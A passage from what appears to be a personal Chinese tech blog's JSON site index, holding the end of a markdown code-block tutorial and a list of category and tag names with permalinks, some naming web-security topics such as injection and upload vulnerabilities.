代码123​&#96;&#96;&#96;语言代码内容​&#96;&#96;&#96;","categories":[{"name":"教学","slug":"教学","permalink":"https://lxy6515.github.io/categories/%E6%95%99%E5%AD%A6/"}],"tags":[{"name":"markdown教学","slug":"markdown教学","permalink":"https://lxy6515.github.io/tags/markdown%E6%95%99%E5%AD%A6/"}]}],"categories":[{"name":"学习","slug":"学习","permalink":"https://lxy6515.github.io/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"教学","slug":"教学","permalink":"https://lxy6515.github.io/categories/%E6%95%99%E5%AD%A6/"}],"tags":[{"name":"报错注错","slug":"报错注错","permalink":"https://lxy6515.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E9%94%99/"},{"name":"html学习","slug":"html学习","permalink":"https://lxy6515.github.io/tags/html%E5%AD%A6%E4%B9%A0/"},{"name":"md5教学","slug":"md5教学","permalink":"https://lxy6515.github.io/tags/md5%E6%95%99%E5%AD%A6/"},{"name":"js学习","slug":"js学习","permalink":"https://lxy6515.github.io/tags/js%E5%AD%A6%E4%B9%A0/"},{"name":"教学","slug":"教学","permalink":"https://lxy6515.github.io/tags/%E6%95%99%E5%AD%A6/"},{"name":"xff和referer伪造, 上传漏洞","slug":"xff和referer伪造-上传漏洞","permalink":"https://lxy6515.github.io/tags/xff%E5%92%8Creferer%E4%BC%AA%E9%80%A0-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"heox教学","slug":"heox教学","permalink":"https://lxy6515.github.io/tags/heox%E6%95%99%E5%AD%A6/"},{"name":"markdown教学","slug":"markdown教学","permalink":"https://lxy6515.github.io/tags/markdown%E6%95%99%E5%AD%A6/"}]}